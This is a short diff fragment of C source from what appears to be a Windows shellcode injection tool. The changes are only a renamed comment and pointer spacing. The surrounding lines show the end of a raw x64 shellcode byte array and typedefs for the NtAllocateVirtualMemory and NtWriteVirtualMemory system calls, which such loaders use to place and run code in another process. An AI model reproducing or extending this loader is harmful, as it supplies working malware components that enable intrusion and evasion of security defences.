@@ -35,7 +35,7 @@ char shellcode_x64[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00
 "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
 
 
-//------------------FUNCTION & STRUCTS---------------------------
+//------------------FUNCTIONS---------------------------
 
 typedef NTSYSCALLAPI NTSTATUS NTALLOCATEVIRTUALMEMORY(
     HANDLE    ProcessHandle,
@@ -44,7 +44,7 @@ typedef NTSYSCALLAPI NTSTATUS NTALLOCATEVIRTUALMEMORY(
     PSIZE_T   RegionSize,
     ULONG     AllocationType,
     ULONG     Protect
-); typedef NTALLOCATEVIRTUALMEMORY* LPNTALLOCATEVIRTUALMEMORY;
+); typedef NTALLOCATEVIRTUALMEMORY *LPNTALLOCATEVIRTUALMEMORY;
 
 typedef NTSYSCALLAPI NTSTATUS NTWRITEVIRTUALMEMORY(
     HANDLE ProcessHandle,
